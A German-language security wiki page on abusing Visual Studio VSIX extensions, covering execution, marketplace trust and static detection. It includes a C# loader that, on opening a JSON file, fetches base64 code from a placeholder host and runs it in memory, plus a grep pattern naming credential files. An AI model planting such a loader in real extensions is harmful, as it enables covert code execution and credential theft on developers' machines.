# Missbrauch von Visual-Studio-VSIX-Erweiterungen

{{#include ../banners/hacktricks-training.md}}

Eine Visual-Studio-Erweiterung kann alltägliche Editor-Aktivitäten nutzen, um Code unter der Identität des angemeldeten Benutzers auszuführen. Eine schädliche VSIX, ein Publisher-Imitat oder ein kompromittiertes Erweiterungsupdate kann diesen Benutzer über reguläre Installationswege erreichen. Die Installation nach einer Administratorabfrage ist ein Installation mit Zustimmung und keine automatische Rechteausweitung.<sup>[[1]](#references)</sup>

## Ausführungsmodell

Klassische VSSDK-Erweiterungen werden üblicherweise innerhalb von `devenv.exe` ausgeführt. Das neuere Modell `VisualStudio.Extensibility` führt moderne .NET-Erweiterungen hauptsächlich in einem separaten Prozess aus: Visual Studio vermittelt Aufrufe an einen dedizierten Prozess `Microsoft.ServiceHub.Host.Extensibility`. Das isoliert die Stabilität der IDE, stellt die Erweiterung jedoch **nicht** in eine Sandbox, die sie von den Windows-Berechtigungen des Benutzers abschirmt. Der genaue Name der ausführbaren Datei kann einen Architekturzusatz enthalten, etwa `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Auslösen durch gewöhnliche Editoraktivitäten

Anstatt nur einen auffälligen Menübefehl bereitzustellen, kann eine Erweiterung `ITextViewOpenClosedListener` implementieren. Der Callback `TextViewOpenedAsync` wird für passende Dokumente aufgerufen, während `TextViewExtensionConfiguration.AppliesTo` die Aktivierung auf einen gängigen Typ wie JSON beschränken kann. Ein echter Formatter oder Linter kann weiterhin die beworbene Funktion ausführen, während beim Öffnen einer Datei als Nebeneffekt eine zweite Aktion gestartet wird.<sup>[[1]](#references)[[3]](#references)</sup>

Das folgende verkürzte Muster zeigt die wichtigen Ausführungspunkte; der Übersicht halber lässt es den legitimen Formatter und die Fehlerbehandlung aus.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Ereignisgesteuerter In-Memory-Loader für verwaltete Assemblies</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Diese Chain lädt Base64-Text herunter, decodiert ihn zu Assembly-Bytes, lädt ihn über einen `MemoryStream` und einen entladbaren `AssemblyLoadContext`, ruft den reflektierten `EntryPoint` mit entweder keinen Parametern oder einem `string[]` auf, wartet asynchrone Einstiegspunkte ab und entlädt den Kontext. Die zweite Stufe wird nicht auf die Festplatte geschrieben, obwohl das VSIX und die primäre Erweiterungs-DLL Artefakte auf der Festplatte bleiben. Base64 bietet weder Authentizität noch Vertraulichkeit; bei Verwendung von HTTP kann ein Angreifer auf dem Übertragungsweg außerdem die Antwort ersetzen.<sup>[[1]](#references)</sup>

Zu den operativen Varianten zählen das Unterdrücken aller Ausnahmen, damit das angekündigte Feature bei einem Fehler beim Staging weiterhin funktioniert, oder die Verwendung von `ITextViewChangedListener`, um die Ausführung nach Bearbeitungen auszulösen. Code wird im Erweiterungshost ausgeführt und kann verwaltete APIs, P/Invoke, Dateien, Zugangsdaten und untergeordnete Prozesse verwenden, die für diesen Benutzer verfügbar sind.<sup>[[1]](#references)</sup>

Eine verwandte, editorspezifische Ausführungsfläche, die auf dem automatischen Laden nativer Plugins basiert, finden Sie hier:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Missbrauch des Vertrauens in Marketplace und Verteilung

Ein VSIX kann als direkt geteilte/phishing-Datei, aus dem Web-Marketplace oder über den integrierten Marketplace-Browser von Visual Studio verbreitet werden. Eine Publisher-Registrierung, die hauptsächlich Eindeutigkeit und eine Liste reservierter Wörter durchsetzt, kann visuell irreführende Publisher-Identitäten zulassen; die Kompromittierung eines bereits vertrauenswürdigen Publishers oder einer Erweiterung ist noch effektiver, da sie eine installierte Benutzerbasis übernimmt. Bei der Marketplace-Installation wird Visual Studio Installer aufgerufen und das heruntergeladene VSIX vorübergehend unter `%LOCALAPPDATA%\Temp` abgelegt; `payload.vsix` wird auch legitim verwendet, daher ist der Dateiname allein kein Indikator.<sup>[[1]](#references)</sup>

MDSec konnte kein Visual-Studio-URL-Protokoll ermitteln, das eine Erweiterung direkt installiert. Ein Operator muss weiterhin erreichen, dass der Benutzer das VSIX installiert und ihm vertraut, oder den Verteilungsweg einer vorhandenen Erweiterung kompromittieren. Ein `AllUsers`-Paket wird möglicherweise unter dem Visual-Studio-Installationsordner installiert und kann eine Erhöhung der Berechtigungen anfordern; dies ist jedoch normales, vom Benutzer bestätigtes Installationsverhalten und kein automatischer Weg zu Administrator- oder SYSTEM-Rechten.<sup>[[1]](#references)[[4]](#references)</sup>

### Statische Analyse in großem Maßstab

VSIX-Pakete sind üblicherweise ZIP-Container. Daher kann eine sichere Pipeline zur Überprüfung von Marketplace-Paketen Pakete auflisten, sie **ohne Laden des Erweiterungscodes** entpacken, die Manifeste analysieren, ausführbare Oberflächen identifizieren und verwaltete Assemblies mit `ilspycmd` dekompilieren. Priorisieren Sie die zur Erweiterung gehörenden Assemblies, nachdem Sie häufig mitgelieferte Abhängigkeiten ausgeschlossen haben, und korrelieren Sie Zeichenfolgen zu Zugangsdaten-Speichern mit Verhaltensmustern wie Datei lesen plus Netzwerk senden, kodieren plus senden, herunterladen plus ausführen, Zugriff auf den Anmeldeinformations-Manager plus Netzwerkzugriff oder Screenshot plus senden.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventarisiere außerdem native DLLs, MSBuild-Targets, Skripte, T4-Vorlagen und Installer-Payloads, statt anzunehmen, dass jede Ausführungsfläche aus verwaltetem Code besteht. Vergleiche verdächtiges Verhalten mit dem im Manifest angegebenen Zweck; Telemetrie und legitime Updater können Exfiltration oder Staging ähneln. Eine rein statische Analyse übersieht gepackten, verschleierten, dynamisch aufgelösten und inaktiven Code. Wer nur die neueste Version prüft, übersieht zudem möglicherweise schädliche ältere Releases.<sup>[[1]](#references)</sup>

Ein separater Projektlade-Angriff kann ein schädliches [MSBuild-Target `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) ausführen, ohne ein VSIX zu installieren.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio-Erweiterungen erneut betrachtet](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Über VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Aufbau eines VSIX-Pakets](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd-.NET-Tool](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder-Tunnel-Kampagne zielt auf irakische Infrastruktur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
